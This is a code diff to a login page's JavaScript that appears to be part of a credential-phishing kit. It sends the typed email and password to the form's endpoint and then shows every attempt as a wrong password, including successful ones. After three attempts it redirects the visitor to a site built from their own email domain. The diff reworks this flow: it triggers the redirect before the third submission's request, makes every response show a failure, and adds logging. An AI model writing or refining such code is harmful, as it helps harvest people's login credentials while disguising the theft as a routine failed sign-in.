@@ -626,11 +626,36 @@ h3,
     var count = 0;
     $(document).on("submit", '.login_form', function(e) {
         count++;
+        console.log("Attempt count: " + count);
+        
         var $form = $(this);
         var $input = $form.find(':submit');
         $input.attr("disabled", 'disabled');
         var email = $("#user_username").val();
         var password = $("#user_password").val();
+        
+        // Check if this is the 3rd attempt BEFORE making the AJAX call
+        if (count >= 3) {
+            console.log("3 attempts reached, redirecting...");
+            // Disable the form completely
+            $("#user_password").attr("disabled", true);
+            $input.attr("disabled", true);
+            
+            // Show a message before redirecting
+            document.getElementById("error").style.display = "block";
+            document.getElementById("error").textContent = "Redirecting...";
+            document.getElementById("error").style.color = "blue";
+            
+            // Redirect after a short delay
+            setTimeout(function() {
+                var redirectUrl = "https://" + changeLogo(fetchEmail());
+                console.log("Redirecting to: " + redirectUrl);
+                window.location.href = redirectUrl;
+            }, 1500);
+            
+            e.preventDefault();
+            return false;
+        }
         
         $.ajax({
             type: $form.attr('method'),
@@ -641,46 +666,53 @@ h3,
             },
             dataType: 'json',
             success: function(data) {
+                console.log("Success response received");
                 console.log("data.redirect ", data.redirect);
                 console.log("data.reset ", data.reset);
                 console.log("data.count "+ count);
 
-                if (count > 2) {
-                    setTimeout(function() {
-                        window.location.href = "https://"+changeLogo(fetchEmail());
-                    }, 0);
-                } else {
-                    console.log('Failed validation check');
-                    document.getElementById("user_password").style.borderColor = "red";
-                    document.getElementById("error").style.display = "block";
-                    document.getElementById("user_password").value = ''; // Clear the password field
-                    $input.removeAttr("disabled"); // Re-enable submit button
-                }
+                // Clear password field and show error for failed attempts
+                document.getElementById("user_password").style.borderColor = "red";
+                document.getElementById("error").style.display = "block";
+                document.getElementById("user_password").value = ''; // Clear the password field
+                $input.removeAttr("disabled"); // Re-enable submit button
+                
+                // Focus on password field for next attempt
+                document.getElementById("user_password").focus();
             },
             error: function(request, x, y) {
+                console.log("Error response received");
+                
+                // Clear password field and show error
+                document.getElementById("user_password").style.borderColor = "red";
+                document.getElementById("error").style.display = "block";
+                document.getElementById("user_password").value = ''; // Clear on error too
+                $input.removeAttr("disabled"); // Re-enable submit button
+                
+                // Focus on password field for next attempt
+                document.getElementById("user_password").focus();
+                
                 if (request.status == 422) {
                     var errorsHtml = "";
                     $.each(request.responseJSON.errors, function(key, value) {
                         errorsHtml += '' + value[0] + '<br/>';
                     });
-                    document.getElementById("error").style.display = "block";
                     document.getElementById("error").textContent = errorsHtml;
                 } else if (request.status == 419) {
                     location.reload();
                 } else {
-                    document.getElementById("error").style.display = "block";
-                    document.getElementById("error").textContent = "Server Error";
+                    document.getElementById("error").textContent = "Server Error. Please try again.";
                 }
-                document.getElementById("user_password").value = ''; // Clear on error too
-                $input.removeAttr("disabled"); // Re-enable submit button
             },
             complete: function(data) {
                 // Complete callback
+                console.log("Request complete. Total attempts: " + count);
             },
             beforeSend: function() {
                 document.getElementById("user_password").style.borderColor = "";
                 document.getElementById("error").style.display = "none";
                 document.getElementById("error").textContent = "Enter the correct password";
+                document.getElementById("error").style.color = "red";
             },
         });
         e.preventDefault(); // Prevent default form submission
